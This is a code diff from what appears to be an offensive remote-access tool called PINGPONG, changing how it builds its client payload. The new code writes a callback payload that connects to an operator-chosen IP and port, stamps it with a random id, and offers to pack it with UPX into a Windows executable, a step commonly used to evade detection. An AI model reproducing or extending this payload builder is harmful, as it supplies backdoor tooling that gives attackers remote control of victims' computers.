@@ -25,10 +25,10 @@ def get_mod_data(p, start_line, end_line):
 		
 	
 def load_config(config_list, payload_d):
-    local_var = globals()
-    for con in config_list:
-        data = payload_d[con]
-        local_var[f'{con}'] = data
+	local_var = globals()
+	for con in config_list:
+		data = payload_d[con]
+		local_var[f'{con}'] = data
 #随机生成密钥		
 def generate_random_str(randomlength=16):
 	random_str =''
@@ -220,17 +220,20 @@ PINGPONG_client("{ip}", {port})""")
 				else:
 					return True
 		elif file_format == '.py':
-			with open("payload.py", "w+", encoding="utf8") as a:
-				a.write(f'usage_list = {open_usage}')
-				a.write(init)
-				for _usage in open_usage:
-					exec(f"a.write({_usage}_mod)")
-				a.write(exit_init)
-				a.write(f"""
-PINGPONG_client("{ip}", {port})""")
-
+			with open("./payload/_basic_conn.py", 'r') as basic_pay:
+				pay = basic_pay.read()
+			with open("_payload.py", "w+", encoding="utf8") as a:
+				payload_id = generate_random_str()
+				a.write(f"_id = {payload_id}")
+				a.write(pay)
+			_choose = input("payload>[*]Generate a backup payload?[y/n]")
+			if _choose == 'y' or _choose == 'Y' or _choose == 'yes' or _choose == 'YES' or _choose == '' or _choose == ' ':
+				upx_dir = input("payload>[*]Please enter your upx dir(blank for u don't have it)>")
+				pack("PINGPONG_payload/PINGPONG_payload", True, upx_dir, '.exe')
+			else:
+				main.print_warn(f'payload>[!]The payload will generate it when you got the connection')
 			if printf:
-				main.print_good(f"payload>[+]Done Successfully, the payload is in {f_father_path}\payload.py")
+				main.print_good(f"payload>[+]Done Successfully, the payload is in {f_father_path}\_payload.py")
 				main.main()
 	else:
 		main.print_normal("payload>[*]Back to the main console")
